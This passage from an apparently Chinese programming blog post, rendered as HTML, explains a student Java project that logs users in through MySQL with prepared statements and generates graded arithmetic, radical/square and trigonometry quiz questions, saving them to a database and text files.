(Exception NumberFormatException) &#123;</span><br><span class="line">        <span class="keyword">if</span> (scannerContent.startsWith(<span class="string">&quot;切换为&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> scannerContent.substring(<span class="number">3</span>);</span><br><span class="line">            <span class="comment">//重置用户的难度类型</span></span><br><span class="line">            <span class="keyword">if</span> (type.equals(<span class="string">&quot;小学&quot;</span>) || type.equals(<span class="string">&quot;初中&quot;</span>) || type.equals(<span class="string">&quot;高中&quot;</span>)) &#123;</span><br><span class="line">                user.setDifficultyType(type);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;请输入正确的指令&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入正确的指令&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="User类"><a href="#User类" class="headerlink" title="User类"></a>User类</h2><h3 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String type;<span class="comment">//用户类型</span></span><br><span class="line"><span class="keyword">private</span> String account;<span class="comment">//用户账号</span></span><br><span class="line"><span class="keyword">private</span> String password;<span class="comment">//用户密码</span></span><br><span class="line"><span class="keyword">private</span> String difficultyType;<span class="comment">//难度类型</span></span><br><span class="line"><span class="comment">//下面的变量需要设置为自己的数据库数据</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/testgeneration?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC&quot;</span>;<span class="comment">//数据库连接地址</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;<span class="comment">//数据库用户名</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;1234&quot;</span>;<span class="comment">//数据库密码</span></span><br></pre></td></tr></table></figure><h3 id="构造器，getter，setter不再赘述"><a href="#构造器，getter，setter不再赘述" class="headerlink" title="构造器，getter，setter不再赘述"></a><del>构造器，getter，setter不再赘述</del></h3><p>但是需要注意保护用户隐私，不比设置密码的getter和setter</p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> User <span class="title function_">login</span><span class="params">(String account, String password)</span> <span class="keyword">throws</span> SQLException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">//1.加载驱动程序</span></span><br><span class="line">    Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    String searchedType;<span class="comment">//从数据库获取到的类型</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT identity from user where account=? and password=?&quot;</span>;</span><br><span class="line">    <span class="comment">//数据库的运行很耗费资源，所以需要及时关闭</span></span><br><span class="line">    <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USER, PASSWORD)) &#123;</span><br><span class="line">        <span class="comment">//下面使用的是PreparedStatement，用法会贴在下面</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(sql)) &#123;</span><br><span class="line">            preparedStatement.setObject(<span class="number">1</span>, account);</span><br><span class="line">            preparedStatement.setObject(<span class="number">2</span>, password);</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> preparedStatement.executeQuery()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (resultSet.next()) &#123;</span><br><span class="line">                    <span class="comment">//从数据库获取类型</span></span><br><span class="line">                    searchedType = resultSet.getString(<span class="string">&quot;identity&quot;</span>);</span><br><span class="line">                    <span class="comment">//返回实例对象</span></span><br><span class="line">                    <span class="keyword">switch</span> (searchedType) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;小学&quot;</span>:</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Primary</span>(account, password, searchedType);</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;初中&quot;</span>:</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JuniorHigh</span>(account, password, searchedType);</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&quot;高中&quot;</span>:</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">High</span>(account, password, searchedType);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//查询失败，返回null</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/QH_JAVA/article/details/48245945">statement 、prepareStatement的用法和解释</a>,转自CSDN</p><h3 id="getQuestionsArray"><a href="#getQuestionsArray" class="headerlink" title="getQuestionsArray"></a>getQuestionsArray</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由子类实现的抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> String[] getQuestionsArray(<span class="type">int</span> number);</span><br></pre></td></tr></table></figure><h3 id="generateQuestions"><a href="#generateQuestions" class="headerlink" title="generateQuestions"></a>generateQuestions</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据输入的题目数量生成题目，并将其添加到数据库</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">generateQuestions</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">    <span class="type">Timestamp</span> <span class="variable">timestamp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Timestamp</span>(System.currentTimeMillis());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//测试重复问题，addQuestionsToDatabase会返回添加失败的个数，getQuestionsArray是根据不同类型的对象生成的，也就是不同难度的题目生成方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">failNum</span> <span class="operator">=</span> addQuestionsToDatabase(getQuestionsArray(number), timestamp);</span><br><span class="line">        <span class="keyword">while</span> (failNum != <span class="number">0</span>) &#123;</span><br><span class="line">            failNum = addQuestionsToDatabase(getQuestionsArray(failNum), timestamp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="generateQuestionsByType"><a href="#generateQuestionsByType" class="headerlink" title="generateQuestionsByType"></a>generateQuestionsByType</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据出题难度来出题，生成匿名对象，仅使用一次出题方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">generateQuestionsByType</span><span class="params">(String type, <span class="type">int</span> number)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;小学&quot;</span>:</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Primary</span>(account, password, type).generateQuestions(number);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;初中&quot;</span>:</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">JuniorHigh</span>(account, password, type).generateQuestions(number);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;高中&quot;</span>:</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">High</span>(account, password, type).generateQuestions(number);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="addQuestionsToDatabase"><a href="#addQuestionsToDatabase" class="headerlink" title="addQuestionsToDatabase"></a>addQuestionsToDatabase</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回添加失败的问题的个数</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">addQuestionsToDatabase</span><span class="params">(String[] questions, Timestamp time)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//1.加载驱动程序</span></span><br><span class="line">    Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;INSERT INTO testgeneration.questions (question, account, created_time) VALUES (?, ?, ?);&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USER, PASSWORD)) &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(sql)) &#123;</span><br><span class="line">            <span class="comment">//创建文件对象</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;questionsData/&quot;</span> + account);</span><br><span class="line">            <span class="comment">//如果没有用户的文件就创建文件夹</span></span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//                System.out.println(file.getPath());</span></span><br><span class="line">            <span class="comment">//创建文件写入对象</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file.getPath() + <span class="string">&quot;/&quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy年-MM月-dd日-HH时-mm分-ss秒&quot;</span>).format(time) + <span class="string">&quot;.txt&quot;</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">                <span class="comment">//在多次写入时preparedStatement就能大大降低运行成本</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; questions.length; i++) &#123;</span><br><span class="line">                    preparedStatement.setObject(<span class="number">1</span>, questions[i]);</span><br><span class="line">                    preparedStatement.setObject(<span class="number">2</span>, account);</span><br><span class="line">                    preparedStatement.setObject(<span class="number">3</span>, time);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        preparedStatement.executeUpdate();</span><br><span class="line">                        fileWriter.write(questions[i] + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//如果重复则会报错，并将重复的题目数量+1</span></span><br><span class="line">                    <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;&#x27;&quot;</span> + questions[i] + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&quot;与之前的题目重复，准备重新出题&quot;</span>);</span><br><span class="line">                        count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="User子类"><a href="#User子类" class="headerlink" title="User子类"></a>User子类</h2><p>User的子类主要介绍生成题目的方法</p><h3 id="Primary"><a href="#Primary" class="headerlink" title="Primary"></a>Primary</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//符号集</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] symbols = &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String[] getQuestionsArray(<span class="type">int</span> number) &#123;</span><br><span class="line">    String[] questions = <span class="keyword">new</span> <span class="title class_">String</span>[number];</span><br><span class="line">    <span class="comment">//StringBuilder在操作变换的字符串的时候效率更高</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">question</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="comment">//以当前时间作为随机种子</span></span><br><span class="line">    <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; number; index++) &#123;</span><br><span class="line">        <span class="comment">//随机生成操作数数量，最少为两个</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">operandsNumber</span> <span class="operator">=</span> random.nextInt(<span class="number">4</span>) + <span class="number">2</span>;</span><br><span class="line">        <span class="comment">//随机生成左括号的位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">bracketStart</span> <span class="operator">=</span> random.nextInt(operandsNumber);</span><br><span class="line">        <span class="comment">//随机生成右括号的位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">bracketEnd</span> <span class="operator">=</span> random.nextInt(operandsNumber);</span><br><span class="line">        <span class="comment">//判断括号位置是否合法</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isBracketIllegal</span> <span class="operator">=</span> bracketStart &lt; bracketEnd;</span><br><span class="line">        <span class="type">int</span>[] operands = <span class="keyword">new</span> <span class="title class_">int</span>[operandsNumber];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; operandsNumber; i++) &#123;</span><br><span class="line">            <span class="comment">//操作数为1~100</span></span><br><span class="line">            operands[i] = random.nextInt(<span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//括号位置合法，并且当前为左括号位置</span></span><br><span class="line">            <span class="keyword">if</span> (isBracketIllegal &amp;&amp; i == bracketStart) &#123;</span><br><span class="line">                question.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            question.append(operands[i]);</span><br><span class="line">            <span class="comment">//操作数合法并且当前为右括号位置</span></span><br><span class="line">            <span class="keyword">if</span> (isBracketIllegal &amp;&amp; i == bracketEnd) &#123;</span><br><span class="line">                question.append(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; operandsNumber - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">//随机从符号集里抽取一个符号</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">symbolIndex</span> <span class="operator">=</span> random.nextInt(symbols.length);</span><br><span class="line">                question.append(symbols[symbolIndex]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//最后一个操作数后面为=号</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                question.append(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        questions[index] = question.toString();</span><br><span class="line">        System.out.println(question);</span><br><span class="line">        <span class="comment">//重新设置问题</span></span><br><span class="line">        question.delete(<span class="number">0</span>, question.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> questions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JuniorHigh"><a href="#JuniorHigh" class="headerlink" title="JuniorHigh"></a>JuniorHigh</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//符号集</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] symbols = &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String[] getQuestionsArray(<span class="type">int</span> number) &#123;</span><br><span class="line">    String[] questions = <span class="keyword">new</span> <span class="title class_">String</span>[number];</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">question</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; number; index++) &#123;</span><br><span class="line">        <span class="comment">//操作数数量，1到5个</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">operandsNumber</span> <span class="operator">=</span> random.nextInt(<span class="number">5</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//括号起始点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">bracketStart</span> <span class="operator">=</span> random.nextInt(operandsNumber);</span><br><span class="line">        <span class="comment">//括号终止点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">bracketEnd</span> <span class="operator">=</span> random.nextInt(operandsNumber);</span><br><span class="line">        <span class="comment">//初中符号个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">juniorSymbolNum</span> <span class="operator">=</span> operandsNumber == <span class="number">1</span> ? <span class="number">1</span> : random.nextInt(operandsNumber) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//根号个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">RadicalNum</span> <span class="operator">=</span> random.nextInt(juniorSymbolNum + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//平方个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">squareNum</span> <span class="operator">=</span> juniorSymbolNum - RadicalNum;</span><br><span class="line">        <span class="comment">//是否有括号</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isBracketIllegal</span> <span class="operator">=</span> bracketStart &lt; bracketEnd;</span><br><span class="line">        <span class="type">int</span>[] operands = <span class="keyword">new</span> <span class="title class_">int</span>[operandsNumber];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; operandsNumber; i++) &#123;</span><br><span class="line">            <span class="comment">//是否加根号</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">addRadical</span> <span class="operator">=</span> operandsNumber == <span class="number">1</span> ? RadicalNum == <span class="number">1</span> : random.nextBoolean();</span><br><span class="line">            <span class="comment">//是否加平方</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">addSquare</span> <span class="operator">=</span> operandsNumber == <span class="number">1</span> ? !addRadical : !addRadical &amp;&amp; random.nextBoolean();</span><br><span class="line">            operands[i] = random.nextInt(<span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (isBracketIllegal &amp;&amp; i == bracketStart) &#123;</span><br><span class="line">                <span class="comment">//在括号外加根号</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">outsideRadical</span> <span class="operator">=</span> random.nextBoolean();</span><br><span class="line">                <span class="keyword">if</span> (outsideRadical &amp;&amp; RadicalNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    question.append(<span class="string">&quot;√&quot;</span>);</span><br><span class="line">                    RadicalNum--;</span><br><span class="line">                &#125;</span><br><span class="line">                question.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//普通根号</span></span><br><span class="line">            <span class="keyword">if</span> (addRadical &amp;&amp; RadicalNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                question.append(<span class="string">&quot;√&quot;</span>);</span><br><span class="line">                RadicalNum--;</span><br><span class="line">            &#125;</span><br><span class="line">            question.append(operands[i]);</span><br><span class="line">            <span class="comment">//普通平方</span></span><br><span class="line">            <span class="keyword">if</span> (addSquare &amp;&amp; squareNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                question.append(<span class="string">&quot;²&quot;</span>);</span><br><span class="line">                squareNum--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (isBracketIllegal &amp;&amp; i == bracketEnd) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">outsideSquare</span> <span class="operator">=</span> random.nextBoolean();</span><br><span class="line"></span><br><span class="line">                question.append(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">                <span class="comment">//括号外平方</span></span><br><span class="line">                <span class="keyword">if</span> (outsideSquare &amp;&amp; squareNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    question.append(<span class="string">&quot;²&quot;</span>);</span><br><span class="line">                    squareNum--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; operandsNumber - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">symbolIndex</span> <span class="operator">=</span> random.nextInt(symbols.length);</span><br><span class="line">                question.append(symbols[symbolIndex]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//最后一个操作数后面为=号</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                question.append(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        questions[index] = question.toString();</span><br><span class="line">        System.out.println(question);</span><br><span class="line">        question.delete(<span class="number">0</span>, question.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> questions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//符号集</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] symbols = &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] highSymbols = &#123;<span class="string">&quot;sin&quot;</span>, <span class="string">&quot;cos&quot;</span>, <span class="string">&quot;tan&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 